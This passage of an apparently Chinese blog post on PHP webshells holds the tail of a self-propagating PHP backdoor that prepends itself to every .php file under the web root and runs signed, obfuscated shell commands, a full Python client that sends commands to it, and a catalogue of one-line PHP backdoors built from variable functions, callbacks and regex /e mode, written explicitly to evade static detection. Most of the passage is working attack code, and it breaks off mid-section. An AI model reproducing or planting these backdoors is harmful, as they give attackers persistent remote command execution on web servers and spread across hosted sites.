    <span class="comment">//要获取的目录</span></span><br><span class="line">        <span class="comment">//先判断指定的路径是不是一个文件夹</span></span><br><span class="line">        <span class="keyword">if</span> (is_dir(<span class="variable">$pdir</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$dh</span> = opendir(<span class="variable">$pdir</span>)) &#123;</span><br><span class="line">                <span class="keyword">while</span> ((<span class="variable">$fi</span> = readdir(<span class="variable">$dh</span>)) != <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="comment">//文件名的全路径 包含文件名</span></span><br><span class="line">                    <span class="variable">$file_Path</span> = <span class="variable">$pdir</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$fi</span>;</span><br><span class="line">                    <span class="keyword">if</span> (strpos(<span class="variable">$file_Path</span>, <span class="string">&#x27;.php&#x27;</span>)) &#123;</span><br><span class="line">                        <span class="comment">//筛选当前目录.php后缀</span></span><br><span class="line">                        <span class="variable">$le</span> = Url_Check();</span><br><span class="line">                        <span class="variable">$file_Path</span> = str_replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="variable">$file_Path</span>);</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&#x27;&lt;iframe id=&quot;check_url&quot;&gt;&#x27;</span> . <span class="variable">$le</span> . <span class="string">&#x27;&#x27;</span> . str_replace(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>], <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_Path</span>) . <span class="string">&#x27;&lt;/iframe&gt;&#x27;</span>;</span><br><span class="line">                        <span class="variable">$ftarget</span> = file(<span class="variable">$file_Path</span>);</span><br><span class="line">                        <span class="keyword">if</span> (!strpos(<span class="variable">$ftarget</span>[<span class="number">0</span>], <span class="string">&#x27;AWD_Light_Check&#x27;</span>)) &#123;</span><br><span class="line">                            <span class="comment">//检查头部是否传播</span></span><br><span class="line">                            <span class="variable">$scode</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                            <span class="variable">$localtext</span> = file(<span class="keyword">__FILE__</span>);</span><br><span class="line">                            <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$Serv_Num</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">                                <span class="variable">$scode</span> .= <span class="variable">$localtext</span>[<span class="variable">$i</span>];</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="variable">$code_check</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                            <span class="variable">$file_check</span> = fopen(<span class="variable">$file_Path</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">                            <span class="comment">//复制要传播的文件代码，进行重写</span></span><br><span class="line">                            <span class="keyword">while</span> (!feof(<span class="variable">$file_check</span>)) &#123;</span><br><span class="line">                                <span class="variable">$code_check</span> .= fgets(<span class="variable">$file_check</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            fclose(<span class="variable">$file_check</span>);</span><br><span class="line">                            <span class="variable">$webpage</span> = fopen(<span class="variable">$file_Path</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                            fwrite(<span class="variable">$webpage</span>, <span class="variable">$scode</span> . <span class="variable">$code_check</span>);</span><br><span class="line">                            fclose(<span class="variable">$webpage</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                closedir(<span class="variable">$dh</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">//主函数</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//定义特征才启动传播模式，特征值为_</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$host</span> = Url_Check();</span><br><span class="line">        file_check(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>]);</span><br><span class="line">        <span class="comment">//全局扫描</span></span><br><span class="line">        write_conf();</span><br><span class="line">        <span class="comment">//写入单文件</span></span><br><span class="line">        vul_tran();</span><br><span class="line">        <span class="comment">//感染当前目录</span></span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;salt&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sign&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">#客户端数字签名校验</span></span><br><span class="line">        <span class="variable">$Check_key</span> = <span class="string">&#x27;9c82746189f3d1815f1e6bfe259dac29&#x27;</span>;</span><br><span class="line">        <span class="variable">$Check_api</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;check&#x27;</span>];</span><br><span class="line">        <span class="variable">$timestamp</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>];</span><br><span class="line">        <span class="variable">$salt</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;salt&#x27;</span>];</span><br><span class="line">        <span class="variable">$csign</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sign&#x27;</span>];</span><br><span class="line">        <span class="variable">$sign</span> = md5(<span class="variable">$Check_api</span> . <span class="variable">$Check_key</span> . <span class="variable">$timestamp</span> . <span class="variable">$salt</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$sign</span> === <span class="variable">$csign</span>) &#123;</span><br><span class="line">            <span class="variable">$nomal_test</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$Check_api</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">                <span class="variable">$nomal_test</span> .= chr(ord(<span class="variable">$Check_api</span>[<span class="variable">$i</span>]) ^ <span class="variable">$i</span> % <span class="variable">$salt</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$nomal_test</span> = base64_decode(<span class="variable">$nomal_test</span>);</span><br><span class="line">            <span class="variable">$nowtime</span> = time();</span><br><span class="line">            <span class="keyword">if</span> (abs(<span class="variable">$nowtime</span> - <span class="variable">$timestamp</span>) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">                <span class="variable">$enc</span> = base64_encode(rawurlencode(`&#123;<span class="variable">$nomal_test</span>&#125;`));</span><br><span class="line">                <span class="comment">//解密并执行命令在加密返回</span></span><br><span class="line">                <span class="variable">$pieces</span> = explode(<span class="string">&quot;i&quot;</span>, <span class="variable">$enc</span>);</span><br><span class="line">                <span class="variable">$final</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$pieces</span> <span class="keyword">as</span> <span class="variable">$val</span>) &#123;</span><br><span class="line">                    <span class="variable">$final</span> .= <span class="variable">$val</span> . <span class="string">&quot;cAFAcABAAswTA2GE2c&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$final</span> = str_replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;:kcehc_revres&quot;</span>, <span class="variable">$final</span>);</span><br><span class="line">                <span class="keyword">echo</span> strrev(substr(<span class="variable">$final</span>, <span class="number">0</span>, strlen(<span class="variable">$final</span>) - <span class="number">18</span>));</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                header(<span class="string">&#x27;HTTP/1.1 500 Internal Server Error&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            header(<span class="string">&#x27;HTTP/1.1 500 Internal Server Error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        header(<span class="string">&#x27;HTTP/1.1 500 Internal Server Error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e2</span>) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2.7</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line">passwd = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">webshell_url = <span class="string">&#x27;http://192.168.75.134/wuhen.php&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;ifconfig&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSerTime</span>(<span class="params">url</span>):</span></span><br><span class="line">    ser_time_format = <span class="string">&#x27;%a, %d %b %Y %H:%M:%S GMT&#x27;</span></span><br><span class="line">    r = requests.get(url, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> r.headers[<span class="string">&#x27;Date&#x27;</span>]:</span><br><span class="line">        stimestrp = time.strptime(r.headers[<span class="string">&#x27;Date&#x27;</span>], ser_time_format)</span><br><span class="line">        stime = time.mktime(stimestrp) + <span class="number">60</span> * <span class="number">60</span> * <span class="number">8</span>  <span class="comment"># GMT + 8 时区</span></span><br><span class="line">        timeskew = <span class="built_in">int</span>(time.time()) - <span class="built_in">int</span>(stime)</span><br><span class="line">        <span class="keyword">return</span> timeskew</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">string, salt, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>):</span></span><br><span class="line">    estring = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    b64string = base64.b64encode(string.encode(encoding)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> n, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(b64string):</span><br><span class="line">        estring += <span class="built_in">chr</span>(<span class="built_in">ord</span>(char) ^ n % salt)</span><br><span class="line">    <span class="keyword">return</span> estring</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">estring, salt, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>):</span></span><br><span class="line">    data = estring[::-<span class="number">1</span>].replace(<span class="string">&#x27;cAFAcABAAswTA2GE2c&#x27;</span>, <span class="string">&#x27;i&#x27;</span>).replace(<span class="string">&#x27;:kcehc_revres&#x27;</span>, <span class="string">&#x27;=&#x27;</span>).encode(</span><br><span class="line">        <span class="string">&#x27;unicode_escape&#x27;</span>).decode(<span class="string">&quot;string_escape&quot;</span>)</span><br><span class="line">    string = unquote(base64.urlsafe_b64decode(data))</span><br><span class="line">    string = unicode(string, <span class="string">&quot;gb2312&quot;</span>).encode(<span class="string">&quot;utf8&quot;</span>)  <span class="comment"># windows有中文乱码去掉这个注释，linux去掉这行，不然会报错</span></span><br><span class="line">    <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令执行</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">excmd</span>(<span class="params">url, passwd, cmd, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        timeskew = getSerTime(<span class="string">&#x27;/&#x27;</span>.join(url.split(<span class="string">&#x27;/&#x27;</span>)[:-<span class="number">1</span>]))</span><br><span class="line">        <span class="comment"># 校对服务器时间，防止时间差造成API校验失败</span></span><br><span class="line">        nowtime = <span class="built_in">int</span>(time.time())</span><br><span class="line">        <span class="keyword">if</span> timeskew == <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;检查服务器时间出错，请手动确认服务器时间！&#x27;</span>)</span><br><span class="line">            <span class="comment"># 手动获取服务器时间戳，并保存到servtime变量中，int类型</span></span><br><span class="line">            <span class="comment"># Linux下获取方法：date +%s</span></span><br><span class="line">            servtime = <span class="number">1540891350</span></span><br><span class="line">            nowtime = servtime</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            nowtime -= timeskew</span><br><span class="line">        <span class="comment"># 开始发起请求</span></span><br><span class="line">        passwd = md5(passwd.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">        salt = <span class="built_in">int</span>(random() * <span class="number">100</span>)</span><br><span class="line">        ecmd = encrypt(cmd, salt)</span><br><span class="line">        sign_tmp = ecmd + passwd + <span class="built_in">str</span>(nowtime) + <span class="built_in">str</span>(salt)</span><br><span class="line">        sign = md5(sign_tmp.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">        parameters = &#123;</span><br><span class="line">            <span class="string">&#x27;time&#x27;</span>: nowtime,</span><br><span class="line">            <span class="string">&#x27;check&#x27;</span>: ecmd,</span><br><span class="line">            <span class="string">&#x27;salt&#x27;</span>: salt,</span><br><span class="line">            <span class="string">&#x27;sign&#x27;</span>: sign</span><br><span class="line">        &#125;</span><br><span class="line">        head = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span>&#125;</span><br><span class="line">        r = requests.get(url, params=parameters, headers=head, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="comment"># r = requests.post(url, data=parameters, headers=head, proxies=&#123;&#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;&#125;),</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;0:&#x27;</span> <span class="keyword">in</span> r.text: <span class="built_in">print</span></span><br><span class="line">        <span class="string">&#x27;执行成功：&#x27;</span>,</span><br><span class="line">        res = decrypt(r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>).replace(<span class="string">&#x27;0:&#x27;</span>, <span class="string">&#x27;&#x27;</span>), salt, encoding)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        <span class="comment"># print(&#x27;参数配置错误，连接异常err:%s&#x27;%str(e))</span></span><br><span class="line">        traceback.print_exc()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    r = excmd(webshell_url, passwd, cmd)</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="动态特性类"><a href="#动态特性类" class="headerlink" title="动态特性类"></a>动态特性类</h1><h2 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h2><p>允许我们动态地改变一个变量的名称</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>=<span class="string">&#x27;c&#x27;</span>;</span><br></pre></td></tr></table></figure><p>等价于：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;c&#x27;</span>;</span><br></pre></td></tr></table></figure><p>双刀大法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h2><p> 如果一个变量名后有圆括号，PHP 将寻找与<strong>变量的值同名的函数</strong>，并且尝试执行它利用可变函数，我们可以将函数名也作为参数进行传递，避免敏感关键字被静态检测识别出来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211201140328774.png" alt="image-20211201140328774"></p><blockquote><p>一般都是使用<code>assert</code>，因为<code>eval</code>不能被可变函数调用</p></blockquote><h2 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h2><p>回调函数是指调用函数的时候，将另一个函数作为参数传递到调用的函数中，而不是传递一个普通的变量作为参数。使用回调函数是为了可以将一段自己定义的功能传到函数内部使用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @call_user_func(<span class="string">&#x27;assert&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>call_user_func_array</code>函数，和<code>call_user_func</code>类似，只是第二个参数可以传入参数列表组成的数组。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @call_user_func_array(<span class="string">&#x27;assert&#x27;</span>, <span class="keyword">array</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>])); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在php中回调函数很多，含有回调（callable类型）参数的函数，其实都有做“回调后门”的潜力。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>],);</span><br><span class="line">array_filter(<span class="variable">$arr</span>, base64_decode(<span class="variable">$e</span>));</span><br></pre></td></tr></table></figure><blockquote><p>array_filter函数是将数组中所有元素遍历并用指定函数处理过滤用的</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211201162038405.png" alt="image-20211201162038405"></p><h3 id="php5-4-8-assert支持两个参数"><a href="#php5-4-8-assert支持两个参数" class="headerlink" title="php5.4.8+ assert支持两个参数"></a>php5.4.8+ assert支持两个参数</h3><h4 id="uasort"><a href="#uasort" class="headerlink" title="uasort"></a>uasort</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line">uasort(<span class="variable">$arr</span>, base64_decode(<span class="variable">$e</span>));</span><br></pre></td></tr></table></figure><blockquote><p>后门在php5.3时会报错，提示assert只能有一个参数</p></blockquote><h4 id="uksort"><a href="#uksort" class="headerlink" title="uksort"></a>uksort</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="number">1</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="number">2</span>);</span><br><span class="line">uksort(<span class="variable">$arr</span>, <span class="variable">$e</span>);</span><br></pre></td></tr></table></figure><p>面向对象的方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// way 0</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]));</span><br><span class="line"><span class="variable">$arr</span>-&gt;uasort(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// way 1</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="number">1</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="number">2</span>));</span><br><span class="line"><span class="variable">$arr</span>-&gt;uksort(<span class="string">&#x27;assert&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="array-reduce-array-map"><a href="#array-reduce-array-map" class="headerlink" title="array_reduce/array_map"></a>array_reduce/array_map</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>);</span><br><span class="line">array_reduce(<span class="variable">$arr</span>, <span class="variable">$e</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure><h4 id="array-udiff"><a href="#array-udiff" class="headerlink" title="array_udiff"></a>array_udiff</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"><span class="variable">$arr2</span> = <span class="keyword">array</span>(<span class="number">1</span>);</span><br><span class="line">array_udiff(<span class="variable">$arr</span>, <span class="variable">$arr2</span>, <span class="variable">$e</span>);</span><br></pre></td></tr></table></figure><h3 id="三个参数的回调"><a href="#三个参数的回调" class="headerlink" title="三个参数的回调"></a>三个参数的回调</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="string">&#x27;|.*|e&#x27;</span>,);</span><br><span class="line">array_walk(<span class="variable">$arr</span>, <span class="variable">$e</span>, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>上面说过</p><p>一个参数：<code>assert</code><br>两个参数：<code>assert （php5.4.8+）</code><br>三个参数：<code>preg_replace /e</code>模式</p><p><code>e=preg_replace</code> <code>/e</code>模式, 只限用于preg_replace()函数,把替换的字符串中的内容当成一个PHP表达式。</p><p>array_walk_recursive同</p></blockquote><h2 id="正则e模式"><a href="#正则e模式" class="headerlink" title="正则e模式"></a>正则e模式</h2><h3 id="mb-ereg-replace"><a href="#mb-ereg-replace" class="headerlink" title="mb_ereg_replace"></a>mb_ereg_replace</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mb_ereg_replace(<span class="string">&#x27;.*&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>], <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;e&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="preg-filter"><a href="#preg-filter" class="headerlink" title="preg_filter"></a>preg_filter</h3><figure class="highlight 